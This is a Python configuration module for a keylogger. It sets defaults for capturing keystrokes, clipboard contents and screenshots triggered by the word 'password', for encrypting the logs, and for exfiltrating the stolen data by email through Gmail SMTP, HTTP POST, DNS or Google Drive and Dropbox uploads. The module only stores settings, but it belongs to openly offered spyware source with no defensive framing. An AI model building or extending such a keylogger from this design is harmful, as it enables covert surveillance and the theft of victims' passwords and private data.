"""
Keylogger Configuration

Default settings and configuration options.
"""

import os
from pathlib import Path
from typing import Dict, Any, Optional


class Config:
    """Configuration manager for keylogger."""
    
    # Default settings
    DEFAULTS: Dict[str, Any] = {
        'log_file': None,  # Auto-generate
        'encrypt_logs': True,
        'exfil_enabled': False,
        'log_clipboard': True,
        'log_screenshots': False,
        'screenshot_trigger': 'password',
        'debug': False,
        
        # Exfiltration settings
        'exfil_method': None,  # 'email', 'http', 'dns', 'cloud'
        'exfil_interval': 300,  # seconds
        
        # Email exfil
        'smtp_server': 'smtp.gmail.com',
        'smtp_port': 587,
        'smtp_user': '',
        'smtp_pass': '',
        'exfil_email': '',
        
        # HTTP exfil
        'http_url': '',
        'http_method': 'POST',
        
        # Cloud exfil
        'cloud_provider': 'gdrive',  # 'gdrive', 'dropbox'
        'cloud_token': '',
    }
    
    def __init__(self, config_file: Optional[str] = None):
        """
        Initialize configuration.
        
        Args:
            config_file: Optional path to config file
        """
        self.config = self.DEFAULTS.copy()
        
        if config_file:
            self.load(config_file)
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value."""
        return self.config.get(key, default)
    
    def set(self, key: str, value: Any):
        """Set configuration value."""
        self.config[key] = value
    
    def load(self, path: str):
        """Load configuration from file."""
        import json
        
        try:
            with open(path, 'r') as f:
                file_config = json.load(f)
                self.config.update(file_config)
        except Exception as e:
            raise ConfigError(f"Failed to load config: {e}")
    
    def save(self, path: str):
        """Save configuration to file."""
        import json
        
        # Don't save sensitive data
        safe_config = {
            k: v for k, v in self.config.items()
            if not any(s in k.lower() for s in ['pass', 'token', 'key'])
        }
        
        with open(path, 'w') as f:
            json.dump(safe_config, f, indent=2)


class ConfigError(Exception):
    """Configuration error."""
    pass


# Global configuration instance
_config: Optional[Config] = None


def get_config() -> Config:
    """Get global configuration."""
    global _config
    if _config is None:
        _config = Config()
    return _config


def init_config(config_file: Optional[str] = None) -> Config:
    """Initialize global configuration."""
    global _config
    _config = Config(config_file)
    return _config
